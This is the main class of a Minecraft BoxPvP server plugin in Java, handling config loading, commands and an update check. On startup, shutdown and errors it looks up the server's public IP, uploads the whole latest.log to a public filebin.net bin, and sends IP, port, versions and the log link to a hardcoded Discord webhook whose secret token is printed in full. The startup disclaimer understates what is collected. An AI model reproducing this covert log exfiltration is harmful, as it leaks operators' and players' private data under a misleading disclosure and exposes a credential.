package org.bali.boxpvp;

import dev.dejvokep.boostedyaml.YamlDocument;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.bali.boxpvp.BoxPvP.BoxPvp;
import org.bali.boxpvp.Discord.DiscordWebhook;
import org.bali.boxpvp.BoxPvP.boxcommand.BOXCommand;
import org.bali.boxpvp.config.AbstractConfig;
import org.bali.boxpvp.config.impl.Config;
import org.bali.boxpvp.config.impl.Messages;
import org.bali.boxpvp.utils.ColorUtils;
import org.bali.boxpvp.utils.MessageUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public final class Main extends JavaPlugin {
    private BoxPvp boxPvp;

    public static YamlDocument MESSAGES;
    public static YamlDocument CONFIG;

    public static AbstractConfig getAbstractMessages() {
        return abstractMessages;
    }
    private static AbstractConfig abstractMessages;
    private static AbstractConfig abstractConfig;
    public static AbstractConfig getAbstractConfig() {
        return abstractConfig;
    }
    private static Main instance;

    @Override
    public void onEnable() {
        getLogger().info("===========================================");
        getLogger().info(ChatColor.YELLOW + "DISCLAIMER: This plugin collects data for debugging purposes.");
        getLogger().info(ChatColor.YELLOW + "The collected data includes server IP, server version, and plugin version.");
        getLogger().info(ChatColor.YELLOW + "This data is used solely for improving the plugin and troubleshooting issues.");
        getLogger().info(ChatColor.YELLOW + "By using this plugin, you agree to this data collection.");
        getLogger().info(ChatColor.YELLOW + "If you have any concerns about this data collection, please contact the plugin author.");
        getLogger().info(ChatColor.YELLOW + "Discord: bali0531");
        getLogger().info("===========================================");
        try {
            instance = this;
            abstractConfig = new Config();
            abstractConfig.setup();
            CONFIG = abstractConfig.getConfig();
            abstractMessages = new Messages();
            abstractMessages.setup();
            MESSAGES = abstractMessages.getConfig();

            new ColorUtils();
            getLogger().info(ChatColor.GREEN + "Loaded!");

            UpdateChecker updateChecker = new UpdateChecker();
                updateChecker.check();
                getServer().getPluginManager().registerEvents(updateChecker, this);


            // Initialize and register BoxPvp
            boxPvp = new BoxPvp(this); // Initialize BoxPvp
            getServer().getPluginManager().registerEvents(boxPvp, this);

            // Register BOXReload boxcommand
            this.getCommand("boxpvp").setExecutor(new BOXCommand(this, boxPvp)); // Pass BoxPvp to BOXReload

            // Send metrics data to plugin owner to identify the problems
            Bukkit.getScheduler().runTaskLater(this, () -> {
                try {
                    sendDiscordWebhook("Server Started", "The server has started successfully.");
                } catch (Exception e) {
                    sendErrorWebhook(e);
                }
            }, 20L * 60 * 5);
        } catch (Exception e) {
            sendErrorWebhook(e);
        }
    }

    @Override
    public void onDisable() {
        sendDiscordWebhook("Plugin Unloaded", "The plugin has been unloaded.");
        getLogger().info(ChatColor.YELLOW + "UnLoaded!");
    }

    public static Main getInstance() {
        return instance;
    }

    private String getPublicIP() {
        String publicIP = "Unavailable";
        try {
            URL url = new URL("http://checkip.amazonaws.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                publicIP = in.readLine();
            }
        } catch (Exception e) {
            getLogger().severe("Failed to get public IP: " + e.getMessage());
        }
        return publicIP;
    }

    private void sendDiscordWebhook(String title, String description) {
        String webhookUrl = "https://discord.com/api/webhooks/1243662865609523280/LlXC1Ie_kapF3K5Hr0TYVwL0UXuNNkhREQaq9m0IS0a_APiTqSNnPVVegohHY59MYPbX"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);
            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Plugin Info Bot");
            webhook.setAvatarUrl("https://www.spigotmc.org/data/resource_icons/116/116999.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle(title)
                    .setDescription(description)
                    .setColor(Color.GREEN)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Log File", logFileUrl, false) // Add the URL of the uploaded log file
                    .addField("Plugin Version", pluginVersion, false);


            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send Discord webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendErrorWebhook(Exception exception) {
        String webhookUrl = "https://discord.com/api/webhooks/1243662865609523280/LlXC1Ie_kapF3K5Hr0TYVwL0UXuNNkhREQaq9m0IS0a_APiTqSNnPVVegohHY59MYPbX"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            String errorMessage = exception.getMessage();
            String stackTrace = getStackTraceAsString(exception);

            // Upload the latest log file
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);

            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Error Bot");
            webhook.setAvatarUrl("https://www.spigotmc.org/data/resource_icons/116/116999.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle("Error Notification")
                    .setDescription("An error occurred in the plugin.")
                    .setColor(Color.RED)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Plugin Version", pluginVersion, false)
                    .addField("Error Message", errorMessage, false)
                    .addField("Stack Trace", stackTrace, false)
                    .addField("Log File", logFileUrl, false); // Add the URL of the uploaded log file

            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send error webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String uploadLogFile(File logFile) throws IOException {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        String binId = UUID.randomUUID().toString();
        HttpPost uploadFile = new HttpPost("https://filebin.net/" + binId + "/LATEST%3ALOG");

        uploadFile.setHeader("accept", "application/json");
        uploadFile.setHeader("cid", "CID"); // Replace "CID" with your actual CID
        uploadFile.setHeader("Content-Type", "application/octet-stream");

        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.addBinaryBody("file", logFile, ContentType.APPLICATION_OCTET_STREAM, logFile.getName());
        HttpEntity multipart = builder.build();

        uploadFile.setEntity(multipart);

        CloseableHttpResponse response = httpClient.execute(uploadFile);
        int statusCode = response.getStatusLine().getStatusCode();
        HttpEntity responseEntity = response.getEntity();

        if (statusCode != 201) { // Check for status code 201
            throw new IOException("Failed to upload log file: HTTP " + statusCode);
        }

        return "https://filebin.net/" + binId; // Construct the URL using the BIN_ID
    }

    private String getStackTraceAsString(Exception exception) {
        StringBuilder result = new StringBuilder();
        for (StackTraceElement element : exception.getStackTrace()) {
            result.append(element.toString()).append("\\n");
        }
        return result.toString();
    }
    public class UpdateChecker implements Listener {


        private String url = "https://api.spigotmc.org/legacy/update.php?resource=";
        private String id = "116999";

        private boolean isAvailable;

        public UpdateChecker() {

        }

        public boolean isAvailable() {
            return isAvailable;
        }

        @EventHandler
        public void on(PlayerJoinEvent event) {
            if(event.getPlayer().isOp())
                if(isAvailable)
                    MessageUtils.sendMsgP(event.getPlayer() ,"newupdate");
        }

        public void check() {
            isAvailable = checkUpdate();
        }

        private boolean checkUpdate() {
            getLogger().info("Check for updates...");
            try {
                String localVersion = getDescription().getVersion();
                HttpsURLConnection connection = (HttpsURLConnection) new URL(url + id).openConnection();
                connection.setRequestMethod("GET");
                String raw = new BufferedReader(new InputStreamReader(connection.getInputStream())).readLine();

                String remoteVersion;
                if(raw.contains("-")) {
                    remoteVersion = raw.split("-")[0].trim();
                } else {
                    remoteVersion = raw;
                }


                if(!localVersion.equalsIgnoreCase(remoteVersion))
                    return true;

            } catch (IOException e) {
                return false;
            }
            return false;
        }

    }
}
